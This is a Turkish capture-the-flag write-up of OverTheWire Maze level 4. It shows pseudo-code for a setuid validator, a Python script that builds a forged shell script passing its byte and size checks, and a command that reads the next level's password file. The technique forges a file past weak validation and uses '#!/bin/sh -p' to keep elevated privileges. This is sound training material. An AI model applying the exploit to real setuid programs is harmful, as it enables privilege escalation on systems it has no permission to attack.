# OverTheWire — Maze Level 4 → 5

> Hedef: `maze4`'ten `maze5` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: Bir "dosya doğrulayıcı"nın zayıf kontrollerini geçip `execv(argv[1])` ile **kendi script'imizi maze5 olarak çalıştırma** + setuid script'te `#!/bin/sh -p` ile yetki düşmesini engelleme.

---

## 1. İlk Bakış
```bash
/maze/maze4               # usage: /maze/maze4 file2check
/maze/maze4 AAAA          # open: No such file or directory
```
argv[1] bir dosya yolu; program dosyayı açıp "doğruluyor", geçerse çalıştırıyor.

## 2. Analiz (sözde-kod)
```c
char buf1[0x34]; char buf2[0x20]; struct stat st;
fd = open(argv[1], O_RDONLY);
stat(argv[1], &st);
read(fd, buf1, 0x34);                 // ilk 52 bayt
lseek(fd, *(int*)&buf1[28], SEEK_SET); // offset = dosya[28..31]
read(fd, buf2, 0x20);                 // o offsetten 32 bayt
if ( *(uint*)&buf2[12] == (ubyte)buf1[7] * (ubyte)buf1[8]   // ÇARPIM kontrolü
     && st.st_size <= 0x7b ) {                              // boyut <= 123
    puts("valid file, executing");
    execv(argv[1], NULL);             // <-- dosyayı ÇALIŞTIR (maze5 yetkisiyle)
}
```

## 3. Geçilecek Koşullar
1. `dosya[7] * dosya[8] == dword(buf2+12)`; burada `buf2`, dosyanın **`dosya[28..31]`'de yazan offsetten** okunan 32 baytı.
2. Dosya boyutu **≤ 123**.
3. Dosya **execv** edilebilmeli → çalıştırma (`+x`) biti + geçerli format (shebang script).

## 4. Püf Noktaları
- **Shebang `#!/bin/sh -p`**: `execv` euid=maze5'i korur ama `/bin/sh` (dash) `euid != ruid` görünce yetkiyi düşürür. `-p` bayrağı bunu **engeller** → kabuk maze5 kalır.
- **Kontrol baytları kabuğu bozmasın**: Kabuk script'i satır satır okur. 2. satırı **kısa** (`exec sh -p`) yapıp orada `exec` ettiririz → kabuk dosyanın gerisini (offset 24+) **hiç parse etmez**. Böylece `lseek` offset'i (bayt 28-31, içinde NUL var) ve sihirli baytları sona, parse edilmeyen bölgeye gömeriz.
- **`exec sh -p`** argümansız kabuk → **stdin**'den komut okur. maze4'e stdin pipe'ı ile `cat /etc/maze_pass/maze5` besleriz.
- `dosya[7]='s'`, `dosya[8]='h'` (shebang'dan) → çarpım `115*104 = 0x2EB8`.

## 5. Exploit — hazırlanan `check` dosyası
```python
d  = b"#!/bin/sh -p\n"          # 0-12   (bayt7='s', bayt8='h')
d += b"exec sh -p\n"            # 13-23  (kabuk burada exec eder, gerisini okumaz)
d  = d.ljust(28,b'#')
d += (32).to_bytes(4,'little')  # 28-31  -> lseek offset = 32
d  = d.ljust(44,b'#')
d += (0x2EB8).to_bytes(4,'little')  # 44-47 -> read#2(offset 32)+12 == 's'*'h'
d  = d.ljust(64,b'#')           # toplam 64 bayt (<=123)
open("check","wb").write(d); os.chmod("check",0o755)
```
```bash
printf 'cat /etc/maze_pass/maze5\n' | /maze/maze4 "$PWD/check"
# valid file, executing
# euid=15005(maze5) ... <maze5 şifresi>
```

## Dersler
| Konu | Not |
|------|-----|
| Zayıf "doğrulama" | Birkaç bayt + boyut kontrolü gerçek güvenlik sağlamaz; saldırgan dosyayı kolayca uydurur |
| setuid + `execv(kullanıcı_girdisi)` | Kullanıcının verdiği dosyayı çalıştırmak = doğrudan kod çalıştırma |
| Setuid script & `-p` | `#!/bin/sh -p` olmadan dash/bash yetkiyi `ruid`'e düşürür; `-p` korur |
| Shebang + stdin | `exec sh -p` (argümansız) komutları stdin'den okur → uzun yolu script'e gömmeden besle |
| Parse sınırı | Kabuğu erken `exec` ettirip kalan baytları (NUL'lu kontrol verisi) "ölü bölgeye" koy |

> 📚 Konu anlatımı: [setuid, yetki düşürme & `-p` bayrağı](../../konu_anlatimlari/binary_exploitation/19_setuid_yetki_dususu_ve_p_bayragi.md) — `#!/bin/sh -p` ve `setresuid`'in neden gerektiği (ruid/euid/suid modeli).
